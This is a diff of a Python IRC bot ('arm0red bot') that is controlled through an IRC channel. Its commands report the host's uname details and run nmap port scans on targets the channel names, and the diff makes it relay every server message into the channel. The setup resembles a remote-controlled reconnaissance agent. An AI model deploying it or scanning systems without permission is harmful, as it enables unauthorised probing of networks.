@@ -24,7 +24,7 @@
 
 NOTICE = 'THIS BOT IS FOR EDUCATION PURPOSES ONLY! DO NOT USE IT FOR MALICIOUS INTENT!'
 author = 'Stephen Harris (trackmastersteve@gmail.com)'
-version = '0.2.5'
+version = '0.2.7'
 last_modification = '2018.08.19'
 
 import ssl
@@ -61,7 +61,8 @@ def joinchan(chan): # Join channel(s).
     while ircmsg.find("End of /NAMES list.") == -1:
         ircmsg = ircsock.recv(2048).decode("UTF-8")
         ircmsg = ircmsg.strip('\n\r')
-        print(ircmsg)
+        #print(ircmsg)
+        sendmsg(ircmsg, channel)
 
 def partchan(chan): # Join channel(s).
     ircsock.send(bytes("PART "+ chan +"\n", "UTF-8"))
@@ -69,6 +70,9 @@ def partchan(chan): # Join channel(s).
 def ping(): # Respond to server Pings.
     ircsock.send(bytes("PONG :pingis\n", "UTF-8"))
 
+def version(): # Respond to VERSION request.
+    ircsock.send(bytes("VERSION : arm0red bot 0.2.7\n", "UTF-8"))
+    
 def sendmsg(msg, target=channel): # Sends messages to the target.
     ircsock.send(bytes("PRIVMSG "+ target +" :"+ msg +"\n", "UTF-8"))
 
@@ -80,7 +84,7 @@ def uname(): # Used for .uname command
     sysinfo = platform.uname()
     return sysinfo
 
-def nmapScan(tgtHost, tgtPort):
+def nmapScan(tgtHost, tgtPort): # Used for .scan command
     nmScan = nmap.PortScanner()
     nmScan.scan(tgtHost, tgtPort)
     state = nmScan[tgtHost]['tcp'][int(tgtPort)]['state']
@@ -91,13 +95,17 @@ def main():
     while 1:
         ircmsg = ircsock.recv(2048).decode("UTF-8")
         ircmsg = ircmsg.strip('\n\r')
-        print(ircmsg)
+        #print(ircmsg)
+        sendmsg(ircmsg, channel)
 
         # Messages come in from IRC in the format of: ":[Nick]!~[hostname]@[IPAddress]PRIVMSG[channel]:[message]"
-        if ircmsg.find("PRIVMSG") != -1:
+        if ircmsg.find('PRIVMSG') != -1:
             name = ircmsg.split('!',1)[0][1:]
             message = ircmsg.split('PRIVMSG',1)[1].split(':',1)[1]
 
+            if ircmsg.find('VERSION') != -1:
+                version()
+            
             if len(name) < 17:
                 # Respond to NickServ ident request.
                 if message.find('This nickname is registered') != -1:
